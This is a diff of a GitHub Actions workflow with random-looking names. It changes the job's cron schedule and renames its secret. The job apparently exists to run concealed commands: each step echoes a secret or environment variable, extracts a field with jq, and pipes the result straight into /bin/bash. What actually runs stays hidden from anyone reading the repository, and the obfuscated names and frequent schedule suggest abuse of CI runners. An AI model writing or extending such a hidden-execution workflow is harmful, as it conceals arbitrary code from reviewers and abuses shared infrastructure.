@@ -1,8 +1,9 @@
 name: hugouhuohuang
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 3/6 * * *'
+    - cron: '28 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: hugouhuohuang
         env:
-          sped047: ${{ secrets.sped047 }}
+          zuv90: ${{ secrets.zuv90 }}
         run: |
-          echo $sped047 | jq -r .uq7 | /bin/bash
-          echo $env2 | jq -r .xjk71 | /bin/bash
-          echo $ui34806 | jq -r .fbya52 | /bin/bash
-          echo $w9 | jq -r .wx57195 | /bin/bash
-          echo $eomb3456 | jq -r .d96281 | /bin/bash
-          echo $yopf5 | jq -r .piio79 | /bin/bash
-          echo $ioymv15 | jq -r .vhv56 | /bin/bash
-          echo $ofswy307 | jq -r .ncmb836 | /bin/bash
-          echo $fbh03 | jq -r .hbv28910 | /bin/bash
-          echo $v7275 | jq -r .dlln81503 | /bin/bash
-          echo $uckjf07 | jq -r .icscf63552 | /bin/bash
-          echo $pxoq80 | jq -r .bldc04 | /bin/bash
-          echo $vrcj205 | jq -r .qu6545 | /bin/bash
+          echo $zuv90 | jq -r .p406 | /bin/bash
+          echo $tx43775 | jq -r .a774 | /bin/bash
+          echo $xu704 | jq -r .rispt9746 | /bin/bash
+          echo $zjgud7 | jq -r .f6 | /bin/bash
+          echo $kieq89 | jq -r .xsmqi17 | /bin/bash
+          echo $guyj393 | jq -r .qzki47 | /bin/bash
+          echo $d2642 | jq -r .ay84597 | /bin/bash
+          echo $npp487 | jq -r .gzts47 | /bin/bash
+          echo $cemkm2997 | jq -r .k45 | /bin/bash
 
